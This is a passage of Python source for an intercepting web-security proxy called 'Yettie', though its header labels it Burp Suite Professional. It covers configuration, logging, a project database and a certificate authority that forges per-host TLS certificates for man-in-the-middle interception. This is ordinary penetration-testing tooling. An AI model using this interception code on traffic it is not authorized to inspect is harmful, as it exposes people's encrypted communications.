# =================================================================
# BURP SUITE PROFESSIONAL ADVANCED EDITION v3.0
# A comprehensive web security testing platform
# Lines: ~6800
# =================================================================
import pathlib
import socket
import ssl
import threading
import os
import time
import json
import re
import sqlite3
import hashlib
import base64
from typing import TypedDict, Optional
import gzip
from bs4 import BeautifulSoup
from pathlib import Path
import socket
import ssl
import time
import re
import zlib
import gzip
import brotli
from io import BytesIO
from urllib.parse import urlparse
from flask import jsonify, request
import zlib
import urllib.parse
import csv
import uuid
import html
from datetime import datetime, timedelta, timezone
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from flask import Flask, request, jsonify, render_template_string, send_file, Response, stream_with_context, \
    send_from_directory
from functools import lru_cache
from io import StringIO, BytesIO
import secrets
import random
import string
import mimetypes
import asyncio
import hashlib
import hmac
import struct
from dataclasses import dataclass, asdict, field
import xml.etree.ElementTree as ET
import xml.dom.minidom
import pickle
from collections import defaultdict, Counter, deque
import statistics
import math
import itertools
import ipaddress
import concurrent.futures
import logging
from logging.handlers import RotatingFileHandler
import yaml
import msgpack
import brotli
import lzma
import quopri
import binascii
import inspect
import textwrap
import pprint
from typing import Dict, List, Optional, Tuple, Any, Union, Callable, Set
from enum import Enum
import subprocess
import platform
import webbrowser
import zipfile
import tarfile
import tempfile
import shutil
import sys
import traceback
import hashlib
import secrets
import json as json_module
import urllib.request
import urllib.error
import http.client
import ssl as ssl_module
import select
import queue


# =================================================================
# CONFIGURATION
# =================================================================

class Config:
    # Core settings
    PROXY_HOST = "0.0.0.0"
    PROXY_PORT = 8080
    UI_HOST = "127.0.0.1"
    UI_PORT = 8081
    API_PORT = 8082

    # SSL/TLS settings
    CERT_DIR = "certs"
    CA_CERT_FILE = "yettie_ca.crt"
    CA_KEY_FILE = "yettie_ca.key"

    # Database
    DB_FILE = "yettie_pro.db"
    DB_BACKUP_COUNT = 5

    # Directories
    PROJECTS_DIR = "projects"
    LOGS_DIR = "logs"
    TEMP_DIR = "temp"
    PLUGINS_DIR = "plugins"
    REPORTS_DIR = "reports"
    SCRIPTS_DIR = "scripts"
    PAYLOADS_DIR = "payloads"

    # Performance
    MAX_THREADS = 100
    MAX_CONNECTIONS = 500
    SOCKET_TIMEOUT = 30
    REQUEST_TIMEOUT = 60
    BUFFER_SIZE = 65536

    # Security
    ALLOWED_ORIGINS = ["http://localhost:8081", "http://127.0.0.1:8081"]
    SESSION_TIMEOUT = 3600
    MAX_REQUEST_SIZE = 100 * 1024 * 1024  # 100MB

    # Scanner
    SCAN_THREADS = 10
    MAX_SCAN_DEPTH = 10
    SCAN_TIMEOUT = 300

    # Intruder
    INTRUDER_THREADS = 20
    MAX_PAYLOADS = 100000

    # UI
    UI_THEME = "light"
    AUTO_SAVE_INTERVAL = 60  # seconds

    @classmethod
    def init_directories(cls):
        """Create necessary directories"""
        directories = [
            cls.CERT_DIR, cls.PROJECTS_DIR, cls.LOGS_DIR,
            cls.TEMP_DIR, cls.PLUGINS_DIR, cls.REPORTS_DIR,
            cls.SCRIPTS_DIR, cls.PAYLOADS_DIR
        ]
        for directory in directories:
            os.makedirs(directory, exist_ok=True)


Config.init_directories()


# =================================================================
# LOGGING
# =================================================================

class AdvancedLogger:
    """Advanced logging system with multiple handlers"""

    def __init__(self):
        self.logger = logging.getLogger("YettiePro")
        self.logger.setLevel(logging.DEBUG)

        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_format = logging.Formatter(
            '[%(asctime)s] %(levelname)s: %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        console_handler.setFormatter(console_format)

        # File handler
        file_handler = RotatingFileHandler(
            f"{Config.LOGS_DIR}/yettie.log",
            maxBytes=10 * 1024 * 1024,  # 10MB
            backupCount=5
        )
        file_handler.setLevel(logging.DEBUG)
        file_format = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(filename)s:%(lineno)d - %(message)s'
        )
        file_handler.setFormatter(file_format)

        # Error handler
        error_handler = RotatingFileHandler(
            f"{Config.LOGS_DIR}/errors.log",
            maxBytes=5 * 1024 * 1024,  # 5MB
            backupCount=3
        )
        error_handler.setLevel(logging.ERROR)

        self.logger.addHandler(console_handler)
        self.logger.addHandler(file_handler)
        self.logger.addHandler(error_handler)

        # SQLite logging
        self._init_log_db()

    def _init_log_db(self):
        """Initialize SQLite logging database"""
        conn = sqlite3.connect(f"{Config.LOGS_DIR}/audit.db")
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS audit_logs (
                id TEXT PRIMARY KEY,
                timestamp TEXT,
                level TEXT,
                module TEXT,
                user TEXT,
                ip_address TEXT,
                action TEXT,
                details TEXT,
                metadata TEXT
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS security_events (
                id TEXT PRIMARY KEY,
                timestamp TEXT,
                event_type TEXT,
                severity TEXT,
                source_ip TEXT,
                target_url TEXT,
                description TEXT,
                evidence TEXT,
                mitigated INTEGER DEFAULT 0
            )
        """)
        conn.commit()
        conn.close()

    def info(self, message, **kwargs):
        self.logger.info(message)
        self._log_to_db("INFO", message, kwargs)

    def warning(self, message, **kwargs):
        self.logger.warning(message)
        self._log_to_db("WARNING", message, kwargs)

    def error(self, message, **kwargs):
        self.logger.error(message)
        self._log_to_db("ERROR", message, kwargs)

    def debug(self, message, **kwargs):
        self.logger.debug(message)
        self._log_to_db("DEBUG", message, kwargs)

    def critical(self, message, **kwargs):
        self.logger.critical(message)
        self._log_to_db("CRITICAL", message, kwargs)

    def audit(self, user, action, details, ip_address=None, metadata=None):
        """Log security audit events"""
        log_id = str(uuid.uuid4())
        timestamp = datetime.now(timezone.utc).isoformat()

        conn = sqlite3.connect(f"{Config.LOGS_DIR}/audit.db")
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO audit_logs VALUES (?,?,?,?,?,?,?,?,?)
        """, (
            log_id, timestamp, "AUDIT", "Security",
            user, ip_address or request.remote_addr if 'request' in globals() else "N/A",
            action, details, json.dumps(metadata) if metadata else "{}"
        ))
        conn.commit()
        conn.close()

    def security_event(self, event_type, severity, description, source_ip=None, target_url=None, evidence=None):
        """Log security events"""
        event_id = str(uuid.uuid4())
        timestamp = datetime.now(timezone.utc).isoformat()

        conn = sqlite3.connect(f"{Config.LOGS_DIR}/audit.db")
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO security_events VALUES (?,?,?,?,?,?,?,?,?)
        """, (
            event_id, timestamp, event_type, severity,
            source_ip or "N/A", target_url or "N/A",
            description, evidence or "{}", 0
        ))
        conn.commit()
        conn.close()

    def _log_to_db(self, level, message, metadata):
        """Log to SQLite database"""
        try:
            log_id = str(uuid.uuid4())
            timestamp = datetime.now(timezone.utc).isoformat()

            # Get calling module
            frame = inspect.currentframe().f_back.f_back
            module = frame.f_globals.get('__name__', 'unknown')

            conn = sqlite3.connect(f"{Config.LOGS_DIR}/audit.db")
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO audit_logs (id, timestamp, level, module, action, details)
                VALUES (?,?,?,?,?,?)
            """, (
                log_id, timestamp, level, module,
                "Log Message", f"{message} | Metadata: {json.dumps(metadata)}"
            ))
            conn.commit()
            conn.close()
        except Exception as e:
            # Fallback to file logging if DB fails
            self.logger.error(f"Failed to log to database: {e}")


logger = AdvancedLogger()


# =================================================================
# DATABASE MANAGER
# =================================================================

class DatabaseManager:
    """Advanced database management with connection pooling and migrations"""

    def __init__(self):
        self.db_file = Config.DB_FILE
        self.connections = {}
        #self.lock = threading.Lock()
        self.lock = threading.RLock()  # Change to RLock for reentrant locks
        self.write_lock = threading.Lock()  # Separate lock for write operations
        self._init_database()

    def _init_database(self):
        """Initialize database with advanced schema"""
        conn = self.get_connection()
        cursor = conn.cursor()

        # Enable WAL mode for better concurrency
        cursor.execute("PRAGMA journal_mode=WAL")
        cursor.execute("PRAGMA synchronous=NORMAL")
        cursor.execute("PRAGMA foreign_keys=ON")#on
        cursor.execute("PRAGMA cache_size=-12000")  # 2MB cache
        cursor.execute("PRAGMA temp_store=MEMORY")

        # Core tables
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS projects (
                id TEXT PRIMARY KEY,
                name TEXT UNIQUE NOT NULL,
                description TEXT,
                created TEXT,
                modified TEXT,
                settings TEXT,
                scope TEXT,
                notes TEXT,
                status TEXT DEFAULT 'active',
                stats TEXT
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS requests (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                session_id TEXT,
                timestamp TEXT,
                method TEXT,
                scheme TEXT,
                host TEXT,
                port INTEGER,
                path TEXT,
                query TEXT,
                fragment TEXT,
                headers TEXT,
                body BLOB,
                raw_request BLOB,
                response_code INTEGER,
                response_headers TEXT,
                response_body BLOB,
                raw_response BLOB,
                response_time REAL,
                request_size INTEGER,
                response_size INTEGER,
                mime_type TEXT,
                content_type TEXT,
                status TEXT DEFAULT 'pending',
                tags TEXT,
                notes TEXT,
                comment TEXT,
                edited INTEGER DEFAULT 0,
                bookmarked INTEGER DEFAULT 0,
                highlighted INTEGER DEFAULT 0,
                risk_score REAL DEFAULT 0,
                source_ip TEXT,
                destination_ip TEXT,
                user_agent TEXT,
                referer TEXT,
                cookie TEXT,
                authorization TEXT,
                metadata TEXT,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS scanner_findings (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                request_id TEXT,
                timestamp TEXT,
                issue_type TEXT,
                severity TEXT,
                confidence TEXT,
                url TEXT,
                host TEXT,
                path TEXT,
                parameter TEXT,
                description TEXT,
                detail TEXT,
                remediation TEXT,
                evidence TEXT,
                request TEXT,
                response TEXT,
                cvss_score REAL,
                cwe_id TEXT,
                owasp_category TEXT,
                impact TEXT,
                likelihood TEXT,
                risk_level TEXT,
                status TEXT DEFAULT 'open',
                assigned_to TEXT,
                due_date TEXT,
                fix_date TEXT,
                verified INTEGER DEFAULT 0,
                false_positive INTEGER DEFAULT 0,
                notes TEXT,
                reference_links TEXT,
                metadata TEXT,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE,
                FOREIGN KEY (request_id) REFERENCES requests(id) ON DELETE SET NULL
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS intruder_jobs (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                name TEXT,
                description TEXT,
                created TEXT,
                modified TEXT,
                status TEXT,
                attack_type TEXT,
                target_url TEXT,
                method TEXT,
                headers TEXT,
                body_template TEXT,
                payload_type TEXT,
                payload_sets TEXT,
                payload_count INTEGER,
                payload_processed INTEGER DEFAULT 0,
                results TEXT,
                stats TEXT,
                settings TEXT,
                grep_strings TEXT,
                extract_grep TEXT,
                error_logs TEXT,
                duration REAL,
                start_time TEXT,
                end_time TEXT,
                worker_threads INTEGER,
                rate_limit INTEGER,
                follow_redirects INTEGER,
                process_cookies INTEGER,
                encode_payloads INTEGER,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS repeater_tabs (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                name TEXT,
                created TEXT,
                modified TEXT,
                method TEXT,
                url TEXT,
                headers TEXT,
                body TEXT,
                notes TEXT,
                history TEXT,
                response_data TEXT,
                settings TEXT,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sitemap (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                host TEXT,
                scheme TEXT,
                port INTEGER,
                paths TEXT,
                discovered TEXT,
                last_seen TEXT,
                first_seen TEXT,
                request_count INTEGER DEFAULT 0,
                interesting_files TEXT,
                parameters TEXT,
                technologies TEXT,
                directories TEXT,
                files TEXT,
                endpoints TEXT,
                api_endpoints TEXT,
                metadata TEXT,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sequencer_tokens (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                job_id TEXT,
                token TEXT,
                timestamp TEXT,
                entropy REAL,
                character_distribution TEXT,
                bit_strength REAL,
                randomness_score REAL,
                analyzed INTEGER DEFAULT 0,
                metadata TEXT,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS collaborator_events (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                timestamp TEXT,
                event_type TEXT,
                interaction_type TEXT,
                source_ip TEXT,
                user_agent TEXT,
                data TEXT,
                payload TEXT,
                severity TEXT,
                metadata TEXT,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS macros (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                name TEXT,
                description TEXT,
                created TEXT,
                modified TEXT,
                steps TEXT,
                enabled INTEGER DEFAULT 1,
                settings TEXT,
                metadata TEXT,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                name TEXT,
                created TEXT,
                modified TEXT,
                requests TEXT,
                settings TEXT,
                description TEXT,
                metadata TEXT,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS comparer_sessions (
                id TEXT PRIMARY KEY,
                project_id TEXT,
                name TEXT,
                created TEXT,
                left_data TEXT,
                right_data TEXT,
                diff_result TEXT,
                diff_type TEXT,
                metadata TEXT,
                FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS extender_plugins (
                id TEXT PRIMARY KEY,
                name TEXT,
                version TEXT,
                author TEXT,
                description TEXT,
                enabled INTEGER DEFAULT 1,
                installed TEXT,
                modified TEXT,
                settings TEXT,
                metadata TEXT
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS user_settings (
                user_id TEXT PRIMARY KEY,
                username TEXT,
                preferences TEXT,
                api_keys TEXT,
                last_login TEXT,
                created TEXT,
                metadata TEXT
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS payload_lists (
                id TEXT PRIMARY KEY,
                name TEXT,
                category TEXT,
                description TEXT,
                created TEXT,
                modified TEXT,
                payloads TEXT,
                metadata TEXT
            )
        """)

        # Create indexes for performance
        indexes = [
            ("idx_requests_project", "requests(project_id)"),
            ("idx_requests_timestamp", "requests(timestamp)"),
            ("idx_requests_host", "requests(host)"),
            ("idx_requests_method", "requests(method)"),
            ("idx_scanner_severity", "scanner_findings(severity)"),
            ("idx_scanner_status", "scanner_findings(status)"),
            ("idx_sitemap_host", "sitemap(host)"),
            ("idx_intruder_status", "intruder_jobs(status)"),
            ("idx_sequencer_project", "sequencer_tokens(project_id)"),
            ("idx_macros_project", "macros(project_id)"),
            ("idx_sessions_project", "sessions(project_id)"),
            ("idx_requests_session", "requests(session_id)"),
            ("idx_requests_risk", "requests(risk_score DESC)"),
            ("idx_scanner_cvss", "scanner_findings(cvss_score DESC)"),
            ("idx_intruder_created", "intruder_jobs(created DESC)"),
        ]

        for idx_name, idx_sql in indexes:
            cursor.execute(f"CREATE INDEX IF NOT EXISTS {idx_name} ON {idx_sql}")

        # Create views for common queries
        cursor.execute("""
            CREATE VIEW IF NOT EXISTS vw_project_stats AS
            SELECT 
                p.id,
                p.name,
                COUNT(DISTINCT r.id) as request_count,
                COUNT(DISTINCT s.id) as scan_count,
                COUNT(DISTINCT i.id) as intruder_count,
                MAX(r.timestamp) as last_activity,
                MIN(r.timestamp) as first_activity
            FROM projects p
            LEFT JOIN requests r ON p.id = r.project_id
            LEFT JOIN scanner_findings s ON p.id = s.project_id
            LEFT JOIN intruder_jobs i ON p.id = i.project_id
            GROUP BY p.id, p.name
        """)

        cursor.execute("""
            CREATE VIEW IF NOT EXISTS vw_severity_counts AS
            SELECT 
                project_id,
                severity,
                COUNT(*) as count,
                SUM(CASE WHEN status = 'open' THEN 1 ELSE 0 END) as open_count,
                SUM(CASE WHEN false_positive = 1 THEN 1 ELSE 0 END) as false_positive_count
            FROM scanner_findings
            GROUP BY project_id, severity
        """)

        conn.commit()
        self.release_connection(conn)

        logger.info("Database initialized successfully")

    def get_connection(self):
        """Get database connection with thread safety"""
        thread_id = threading.get_ident()

        with self.lock:
            if thread_id not in self.connections:
                conn = sqlite3.connect(
                    self.db_file,
                    timeout=30,
                    check_same_thread=False
                )
                conn.row_factory = sqlite3.Row
                conn.execute("PRAGMA foreign_keys = ON")
                conn.execute("PRAGMA foreign_keys = ON")
                conn.execute("PRAGMA journal_mode = WAL")  # Enable WAL mode
                conn.execute("PRAGMA synchronous = NORMAL")  # Better performance
                self.connections[thread_id] = conn

            return self.connections[thread_id]

    def execute_with_lock(self, query, params=None):
        """Execute query with exclusive lock for writes"""
        with self.write_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            try:
                if params:
                    cursor.execute(query, params)
                else:
                    cursor.execute(query)
                conn.commit()
                return cursor
            except Exception as e:
                conn.rollback()
                raise e

    def release_connection(self, conn):
        """Release connection (keeps it open for pooling)"""
        pass  # Keep connection open for reuse

    def close_all_connections(self):
        """Close all database connections"""
        with self.lock:
            for conn in self.connections.values():
                try:
                    conn.close()
                except:
                    pass
            self.connections.clear()

        try:
            self.cleanup_old_connections()
        except:
            pass

    def cleanup_old_connections(self):
        """Clean up old database connections"""
        with self.lock:
            current_thread_id = threading.get_ident()
            threads_to_remove = []

            for thread_id, conn in self.connections.items():
                if thread_id != current_thread_id:
                    try:
                        # Check if thread is still alive
                        import threading as th
                        for thread in th.enumerate():
                            if thread.ident == thread_id:
                                break
                        else:
                            # Thread is dead, close connection
                            conn.close()
                            threads_to_remove.append(thread_id)
                    except:
                        pass

            for thread_id in threads_to_remove:
                del self.connections[thread_id]

    def backup_database(self):
        """Create database backup"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"{Config.LOGS_DIR}/backups/yettie_backup_{timestamp}.db"
            os.makedirs(os.path.dirname(backup_file), exist_ok=True)

            # Use SQLite backup API
            source = self.get_connection()
            dest = sqlite3.connect(backup_file)

            source.backup(dest)
            dest.close()

            logger.info(f"Database backed up to {backup_file}")
            return backup_file
        except Exception as e:
            logger.error(f"Database backup failed: {e}")
            return None

    def vacuum(self):
        """Optimize database"""
        try:
            conn = self.get_connection()
            conn.execute("VACUUM")
            conn.commit()
            logger.info("Database optimized with VACUUM")
        except Exception as e:
            logger.error(f"Database optimization failed: {e}")

    def get_stats(self):
        """Get database statistics"""
        conn = self.get_connection()
        cursor = conn.cursor()

        stats = {}
        tables = [
            'projects', 'requests', 'scanner_findings',
            'intruder_jobs', 'repeater_tabs', 'sitemap'
        ]

        for table in tables:
            cursor.execute(f"SELECT COUNT(*) as count FROM {table}")
            stats[table] = cursor.fetchone()[0]

        # Get disk usage
        if os.path.exists(self.db_file):
            stats['disk_size'] = os.path.getsize(self.db_file)

        return stats


db_manager = DatabaseManager()









#========================================
#   DB SCHEMA FOR scanner_findings
#=============================

def normalize_finding(
    finding: Dict,
    request_scan: Dict = None,
    response: Dict = None,
    project_id: str = None,
    scan_id: str = None
) -> Dict:
    """
    Ensure ALL scanner_findings fields exist and are valid
    """

    now = datetime.now(timezone.utc).isoformat()

    # ---------- URL / HOST / PATH ----------
    url = (
        finding.get('url')
        or (request_scan.get('url') if request_scan else None)
        or 'UNKNOWN'
    )

    parsed = urllib.parse.urlparse(url) if url != 'UNKNOWN' else None

    # ---------- DEFAULT SCHEMA ----------
    normalized = {
        # Primary keys
        'id': finding.get('id') or str(uuid.uuid4()),
        'project_id': finding.get('project_id') or project_id or 'default',
        'request_id': finding.get('request_id'),

        # Time
        'timestamp': finding.get('timestamp') or now,

        # Core vulnerability info
        'issue_type': finding.get('issue_type', 'Unknown'),
        'severity': finding.get('severity', 'Info'),
        'confidence': finding.get('confidence', 'Low'),

        # URL info
        'url': url,
        'host': parsed.netloc if parsed else '',
        'path': parsed.path if parsed else '',

        # Context
        'parameter': finding.get('parameter', 'N/A'),
        'description': finding.get('description', ''),
        'detail': finding.get('detail', ''),
        'remediation': finding.get('remediation', ''),
        'evidence': json.dumps(finding.get('evidence', '')),

        # Raw HTTP
        'request': finding.get('request', ''),
        'response': finding.get('response', ''),

        # Risk metrics
        'cvss_score': finding.get(
            'cvss_score',
            5.0
        ),
        'cwe_id': finding.get('cwe_id', 'CWE-0'),
        'owasp_category': finding.get('owasp_category', 'A00:2021'),

        # Risk management
        'impact': finding.get('impact', ''),
        'likelihood': finding.get('likelihood', ''),
        'risk_level': finding.get('risk_level', ''),

        # Workflow
        'status': finding.get('status', 'open'),
        'assigned_to': finding.get('assigned_to'),
        'due_date': finding.get('due_date'),
        'fix_date': finding.get('fix_date'),

        # Validation flags
        'verified': int(finding.get('verified', 0)),
        'false_positive': int(finding.get('false_positive', 0)),

        # Meta
        'notes': finding.get('notes', ''),
        'reference_links': finding.get('reference_links', ''),
        'metadata': json.dumps(finding.get('metadata', {})),
    }

    return normalized



# =================================================================
# CERTIFICATE AUTHORITY
# =================================================================

class CertificateAuthority:
    """Advanced Certificate Authority with proper SSL/TLS handling"""

    def __init__(self):
        self.ca_key = None
        self.ca_cert = None
        self.cert_cache = {}
        self.cert_store = {}
        self.lock = threading.Lock()
        self._init_ca()

    def _init_ca(self):
        """Initialize or load CA certificate"""
        try:
            # Try to load existing CA
            if os.path.exists(Config.CA_KEY_FILE) and os.path.exists(Config.CA_CERT_FILE):
                with open(Config.CA_KEY_FILE, 'rb') as f:
                    self.ca_key = serialization.load_pem_private_key(
                        f.read(),
                        password=None
                    )

                with open(Config.CA_CERT_FILE, 'rb') as f:
                    self.ca_cert = x509.load_pem_x509_certificate(f.read())

                logger.info("Loaded existing CA certificate")
                return
        except Exception as e:
            logger.warning(f"Failed to load CA: {e}")

        # Generate new CA
        logger.info("Generating new CA certificate")
        self._generate_ca()

    def _generate_ca(self):
        """Generate new CA certificate"""
        try:
            # Generate private key
            self.ca_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=4096
            )

            # Generate self-signed certificate
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "GB"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "London"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "London"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Yettie"),
                x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "Yettie Security"),
                x509.NameAttribute(NameOID.COMMON_NAME, "Authorized Yettie CA"),
                x509.NameAttribute(NameOID.EMAIL_ADDRESS, "support@yettie.net")
            ])

            now = datetime.now(timezone.utc)

            self.ca_cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                self.ca_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                now - timedelta(days=1)
            ).not_valid_after(
                now + timedelta(days=3650)  # 10 years
            ).add_extension(
                x509.BasicConstraints(ca=True, path_length=None), #old path length was 0
                critical=True
            ).add_extension(
                x509.KeyUsage(
                    digital_signature=True,
                    content_commitment=True,
                    key_encipherment=True,
                    data_encipherment=True,
                    key_agreement=True,
                    key_cert_sign=True,
                    crl_sign=True,
                    encipher_only=False,
                    decipher_only=False
                ),
                critical=True
            ).add_extension(
                x509.SubjectKeyIdentifier.from_public_key(self.ca_key.public_key()),
                critical=False
            ).add_extension(
                x509.AuthorityKeyIdentifier.from_issuer_public_key(self.ca_key.public_key()),
                critical=False
            ).add_extension(
                x509.ExtendedKeyUsage([
                    x509.oid.ExtendedKeyUsageOID.SERVER_AUTH,
                    x509.oid.ExtendedKeyUsageOID.CLIENT_AUTH
                ]),
                critical=False
            ).sign(self.ca_key, hashes.SHA256())

            # Save CA files
            with open(Config.CA_KEY_FILE, 'wb') as f:
                f.write(self.ca_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))

            with open(Config.CA_CERT_FILE, 'wb') as f:
                f.write(self.ca_cert.public_bytes(serialization.Encoding.PEM))

            logger.info("Generated new CA certificate")

            # Generate CRL
            self._generate_crl()

        except Exception as e:
            logger.critical(f"Failed to generate CA: {e}")
            raise

    def _generate_crl(self):
        """Generate Certificate Revocation List"""
        try:
            builder = x509.CertificateRevocationListBuilder()

            builder = builder.issuer_name(self.ca_cert.subject)
            builder = builder.last_update(datetime.now(timezone.utc))
            builder = builder.next_update(datetime.now(timezone.utc) + timedelta(days=7))

            crl = builder.sign(
                private_key=self.ca_key,
                algorithm=hashes.SHA256()
            )

            with open(f"{Config.CERT_DIR}/ca.crl", 'wb') as f:
                f.write(crl.public_bytes(serialization.Encoding.PEM))

            logger.info("Generated CRL")
        except Exception as e:
            logger.error(f"Failed to generate CRL: {e}")

    def get_certificate(self, hostname: str) -> Tuple[bytes, bytes]:
        """Get or create certificate for hostname"""
        with self.lock:
            # Clean hostname
            hostname = hostname.strip().lower()

            # Check cache first
            if hostname in self.cert_cache:
                cert_data, key_data = self.cert_cache[hostname]
                # Check if certificate is still valid
                try:
                    cert = x509.load_pem_x509_certificate(cert_data)
                    if cert.not_valid_after_utc > datetime.now(timezone.utc):
                        return cert_data, key_data
                except:
                    pass  # Regenerate if invalid

            # Generate new certificate
            cert_data, key_data = self._generate_certificate(hostname)
            self.cert_cache[hostname] = (cert_data, key_data)

            # Limit cache size
            if len(self.cert_cache) > 1000:
                # Remove oldest entries
                keys = list(self.cert_cache.keys())[:500]
                for key in keys:
                    del self.cert_cache[key]

            return cert_data, key_data

    def _generate_certificate(self, hostname: str) -> Tuple[bytes, bytes]:
        """Generate certificate for hostname"""
        try:
            # Generate private key
            key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048
            )

            # Build subject
            subject = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "GB"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Yettie Proxy"),
                x509.NameAttribute(NameOID.COMMON_NAME, hostname)
            ])

            # Build SAN
            san = x509.SubjectAlternativeName([
                x509.DNSName(hostname),
                x509.DNSName(f"*.{hostname}"),
                x509.DNSName("localhost"),
                x509.IPAddress(ipaddress.ip_address("127.0.0.1")),
                x509.IPAddress(ipaddress.ip_address("::1"))
            ])

            now = datetime.now(timezone.utc)

            # Build certificate
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                self.ca_cert.subject
            ).public_key(
                key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                now - timedelta(minutes=5)
            ).not_valid_after(
                now + timedelta(days=365)
            ).add_extension(
                san,
                critical=False
            ).add_extension(
                x509.BasicConstraints(ca=False, path_length=None),
                critical=True
            ).add_extension(
                x509.KeyUsage(
                    digital_signature=True,
                    key_encipherment=True,
                    data_encipherment=False, #True
                    content_commitment=False,
                    key_agreement=False,
                    key_cert_sign=False,
                    crl_sign=False,
                    encipher_only=False,
                    decipher_only=False

                ),
                critical=True
            ).add_extension(
                x509.ExtendedKeyUsage([
                    x509.oid.ExtendedKeyUsageOID.SERVER_AUTH,
                    x509.oid.ExtendedKeyUsageOID.CLIENT_AUTH
                ]),
                critical=False
            ).add_extension(
                x509.SubjectKeyIdentifier.from_public_key(key.public_key()),
                critical=False
            ).add_extension(
                x509.AuthorityKeyIdentifier.from_issuer_public_key(self.ca_key.public_key()),
                critical=False
            ).sign(self.ca_key, hashes.SHA256())

            # Convert to PEM
            cert_pem = cert.public_bytes(serialization.Encoding.PEM)
            key_pem = key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )

            # Save to disk
            cert_file = f"{Config.CERT_DIR}/{hostname}.crt"
            key_file = f"{Config.CERT_DIR}/{hostname}.key"

            with open(cert_file, 'wb') as f:
                f.write(cert_pem)

            with open(key_file, 'wb') as f:
                f.write(key_pem)

            logger.debug(f"Generated certificate for {hostname}")
            return cert_pem, key_pem

        except Exception as e:
            logger.error(f"Failed to generate certificate for {hostname}: {e}")
            raise

    def get_ca_cert_pem(self) -> bytes:
        """Get CA certificate in PEM format"""
        return self.ca_cert.public_bytes(serialization.Encoding.PEM)

    def revoke_certificate(self, hostname: str):
        """Revoke certificate for hostname"""
        try:
            # Remove from cache
            if hostname in self.cert_cache:
                del self.cert_cache[hostname]

            # Delete certificate files
            cert_file = f"{Config.CERT_DIR}/{hostname}.crt"
            key_file = f"{Config.CERT_DIR}/{hostname}.key"

            if os.path.exists(cert_file):
                os.remove(cert_file)

            if os.path.exists(key_file):
                os.remove(key_file)

            logger.info(f"Revoked certificate for {hostname}")

            # Regenerate CRL
            self._generate_crl()

        except Exception as e:
            logger.error(f"Failed to revoke certificate: {e}")

    def get_certificate_info(self, hostname: str) -> Dict:
        """Get certificate information"""
        try:
            cert_file = f"{Config.CERT_DIR}/{hostname}.crt"
            if os.path.exists(cert_file):
                with open(cert_file, 'rb') as f:
                    cert = x509.load_pem_x509_certificate(f.read())

                return {
